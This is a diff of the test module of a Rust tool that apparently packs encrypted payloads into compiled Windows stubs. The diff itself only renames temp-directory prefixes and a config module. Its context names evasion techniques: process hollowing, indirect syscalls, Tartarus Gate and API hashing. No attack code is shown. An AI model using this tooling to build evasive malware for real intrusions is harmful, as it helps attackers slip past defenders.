@@ -410,7 +410,7 @@ fn package_field<'a>(block: &'a str, key: &str) -> Option<&'a str> {
 /// How the compiled stub is finalized, resolved from `build.output`.
 ///
 /// The compiler is the only place that can actually apply these, so the values
-/// are threaded down from the config instead of being display-only.
+/// are threaded down from the plan instead of being display-only.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct CompileOptions {
     /// Strip symbols and debug info (`-C strip=symbols`) when true.
@@ -586,7 +586,7 @@ fn verify_pe_magic(path: &Path) -> Result<()> {
 mod tests {
     use super::*;
 
-    use crate::config::schema::PayloadFormat;
+    use crate::plan::schema::PayloadFormat;
 
     #[test]
     fn find_executable_in_empty_path_is_none() {
@@ -612,7 +612,7 @@ mod tests {
     /// present under a given target directory.
     #[test]
     fn finds_deps_dir_under_debug() {
-        let tmp = std::env::temp_dir().join(format!("batesian_deps_{}", std::process::id()));
+        let tmp = std::env::temp_dir().join(format!("picaro_deps_{}", std::process::id()));
         let deps = tmp.join("debug").join("deps");
         std::fs::create_dir_all(&deps).unwrap();
         for crate_name in ["chacha20poly1305", "hex", "windows"] {
@@ -787,7 +787,7 @@ dependencies = [
         let key = crate::engine::crypto::generate_key();
         let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
 
-        let build_dir = std::env::temp_dir().join(format!("batesian_it_{}", std::process::id()));
+        let build_dir = std::env::temp_dir().join(format!("picaro_it_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
@@ -854,7 +854,7 @@ dependencies = [
         let key = crate::engine::crypto::generate_key();
         let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
 
-        let build_dir = std::env::temp_dir().join(format!("batesian_str_{}", std::process::id()));
+        let build_dir = std::env::temp_dir().join(format!("picaro_str_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
         std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();
@@ -955,7 +955,7 @@ dependencies = [
         let key = crate::engine::crypto::generate_key();
         let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
 
-        let build_dir = std::env::temp_dir().join(format!("batesian_leak_{}", std::process::id()));
+        let build_dir = std::env::temp_dir().join(format!("picaro_leak_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
         std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();
@@ -1079,8 +1079,7 @@ dependencies = [
         .unwrap();
         assert!(rendered.warnings.is_empty(), "no techniques declared");
 
-        let build_dir =
-            std::env::temp_dir().join(format!("batesian_custom_{}", std::process::id()));
+        let build_dir = std::env::temp_dir().join(format!("picaro_custom_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
         let stub_path = build_dir.join("main.rs");
@@ -1098,7 +1097,7 @@ dependencies = [
 
     // --- indirect syscalls (phase 6a) ---
 
-    /// Builds a process-hollowing stub with the given syscall config, writing
+    /// Builds a process-hollowing stub with the given syscall plan, writing
     /// `payload.bin` and the rendered stub into `build_dir`. Returns the path
     /// of the compiled exe. `payload` is the plaintext to pack.
     fn build_hollowing_exe(
@@ -1162,7 +1161,7 @@ dependencies = [
         use crate::audit::pe_info::{self, ImportItem};
 
         let build_dir =
-            std::env::temp_dir().join(format!("batesian_syscalls_{}", std::process::id()));
+            std::env::temp_dir().join(format!("picaro_syscalls_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
@@ -1251,7 +1250,7 @@ dependencies = [
     #[ignore = "requires rustc and the compiled dependencies"]
     fn tartarus_gate_stub_compiles_to_pe() {
         let build_dir =
-            std::env::temp_dir().join(format!("batesian_tartarus_{}", std::process::id()));
+            std::env::temp_dir().join(format!("picaro_tartarus_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
@@ -1294,7 +1293,7 @@ dependencies = [
     #[ignore = "requires rustc and the compiled dependencies"]
     fn api_hash_stub_compiles_to_pe() {
         let build_dir =
-            std::env::temp_dir().join(format!("batesian_api_hash_{}", std::process::id()));
+            std::env::temp_dir().join(format!("picaro_api_hash_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
@@ -1348,7 +1347,7 @@ dependencies = [
             return;
         }
 
-        let build_dir = std::env::temp_dir().join(format!("batesian_run_{}", std::process::id()));
+        let build_dir = std::env::temp_dir().join(format!("picaro_run_{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&build_dir);
         std::fs::create_dir_all(&build_dir).unwrap();
 
